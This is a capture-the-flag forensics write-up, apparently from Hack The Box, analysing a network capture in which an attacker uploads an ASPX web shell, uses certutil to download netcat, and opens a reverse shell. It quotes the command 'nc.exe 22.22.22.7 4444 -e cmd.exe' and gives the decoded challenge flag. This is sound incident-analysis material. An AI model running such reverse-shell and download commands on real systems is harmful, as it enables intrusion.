@@ -1,0 +1,21 @@
+(Challenge Description)
+"One of our web servers triggered an AV alert, but none of the sysadmins say they were logged onto it. We've taken a network capture before shutting the server down to take a clone of the disk. Can you take a look at the PCAP and see if anything is up?"
+
+--Thought Process
+    >Download File
+    >PCAP
+        First thing, check Protocol History (Statistics > Protocol Hierarchy)
+        Noticed TCP and majority of it was HTTP
+        Applied filter, *http*, and discovered 2 main IPs: 22.22.22.7, 22.22.22.5.
+        A *get* request is used to request data from the webserver. A *post* request is used to send data to a server.
+        Following, (22.22.22.7) connects to a webpage, */upload.aspx*. Followed the TCP Stream, looking at the website, it gives an option to chose a file and upload it. 
+        Looking at that line, this was found on github.com/nikicat/web-malware-collection/blob/master/Backdoors/ASP/cmd.aspx
+        After this was run, it was accessed by the attacker with the *get* request on P27. On P37, a *POST* was used with /cmd.aspx.
+        Certutil was used. [https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil] Behaves similar to 'curl' and 'wget'. The program being downloaded was, C:\users\public\nc.exe. Probably netcat to gain a shell
+        P135 was the successful -URLCache command completed
+        Attacker then used cmd.aspx to execute NetCat on P141, running command *nc.exe 22.22.22.7 4444 -e cmd.exe*
+        Removing filter, and following port 4444 traffic, I followed the NetCat TCP Stream. 
+        I saw commands such as 'whoami','ipconfig' and 'cd /' trying to download a .txt file using powershell. Got an error and used, *cerutil* instead to download the .txt.
+        Following the .txt stream, the .txt file just contains *Hey there!*. Deciding that wasnt the Flag, the name looked interesting. I pasted it into CyberChef with the *magic* forumla.
+        The file name [JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA] decoded to [HTB{MAn_8lu3_73aM_R0cX}].
+        FLAG ACHIEVED!
